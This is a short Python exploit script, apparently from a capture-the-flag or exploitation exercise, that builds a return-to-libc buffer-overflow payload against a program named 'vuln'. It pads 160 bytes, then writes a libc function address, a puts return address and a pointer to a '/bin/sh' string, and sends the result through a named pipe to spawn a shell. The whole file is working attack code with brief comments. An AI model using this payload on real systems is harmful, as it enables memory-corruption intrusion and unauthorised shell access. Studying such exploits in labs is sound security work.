#!/usr/bin/env python3

import pathlib

CODING_TYPE = "UTF-8"

# get the path for the named pipe
named_pipe = str(pathlib.Path().absolute()).strip() + "/named_pipe"

# Get the offset of known libc functions
OFFSET = int(input("offset: ").strip())

# calcuate the libc_func_addr for the running vuln executable 
vuln_puts_addr = int(input("vuln_puts: ").strip(), 16)
vuln_func_addr = vuln_puts_addr + OFFSET
# for debugging purposes
print("vuln_func:", hex(vuln_func_addr))

# get the useful_str_addr. The useful string is a pointer to a "/bin/sh" string in the program
useful_str_addr = int(input("useful_str: ").strip(), 16)

# this is the buffer size until we reach the return of the stack frame
# this was discovered by running the program in radare2 in debug mode
BUFFER_SIZE = 160
garbage_data = "A" * BUFFER_SIZE

# This shellcode is some garbage data to fill the buffer,
# the address of the libc function, a return address to puts,
# and a pointer to the useful string, which serves as the first
# argument to the libc function when it is called
shellcode_bytes  = garbage_data.encode(CODING_TYPE)

# In essence we are creating a stack frame for this libc function that we want to return to
#
# the libc function we want to go to
shellcode_bytes += vuln_func_addr.to_bytes(4, 'little')

# the return address for the libc function
shellcode_bytes += vuln_puts_addr.to_bytes(4, 'little')

# the arguments for the libc function
shellcode_bytes += useful_str_addr.to_bytes(4, 'little')

# terminate the shellcode
shellcode_bytes += "\n\0\0\0".encode(CODING_TYPE)

print(shellcode_bytes) # for debugging

# print the shellcode to stdout
open(named_pipe, "wb").write(shellcode_bytes)
